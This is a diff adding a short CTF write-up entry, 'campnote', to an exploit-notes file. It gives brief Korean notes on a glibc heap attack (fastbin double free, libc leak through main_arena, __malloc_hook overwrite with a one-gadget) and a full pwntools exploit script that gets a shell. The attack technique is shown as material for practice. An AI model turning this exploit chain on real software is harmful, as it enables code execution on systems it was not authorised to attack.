@@ -378,7 +378,68 @@ p.interactive()
 
 ## campnote
 
-fastbin
+fastbin dup -> double free -> trigger
+
+small bin이나 large bin을 할당 후 해제하면 fd,bk에 main_arena + 88의 주소가 써진다. -> leak
+
+__malloc_hook -> oneshot
+
+마지막에 double free로 트리거해주면 됨
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+e = ELF('./campnote')
+p = process('./campnote')
+libc = e.libc
+sla = lambda x,y : p.sendlineafter(x,y)
+sa = lambda x,y : p.sendafter(x,y)
+
+def add(size, data):
+	sa('>>', '1')
+	sa('>>', str(size))
+	sa('>>', data)
+
+def delete(idx):
+	sa('>>', '2')
+	sa('>>', str(idx))
+
+def view(idx):
+	sa('>>', '3')
+	sa('>>', str(idx))
+
+def exit():
+	sla('>>','4')
+
+add(0x80,'A')
+add(0x60,'B')
+delete(0)
+view(0)
+libc_base = u64(p.recvuntil('\x7f')[-6:] +'\x00\x00') - libc.symbols['__malloc_hook'] - 88 - 16 # - (0x3c4b20 + 88)
+log.info('libc_base : ' + hex(libc_base))
+malloc = libc_base + libc.symbols['__malloc_hook']
+log.info('__malloc_hook : ' + hex(malloc))
+
+delete(1)
+add(0x60,'A')
+add(0x60,'B')
+
+delete(2)
+delete(3)
+delete(2)
+
+add(0x60,p64(malloc-0x23))
+add(0x60,'C')
+add(0x60,'C')
+add(0x60,'A'*19+p64(libc_base + 0xf02a4))
+
+delete(0)
+delete(0)
+
+p.interactive()
+```
 
 <br />
 
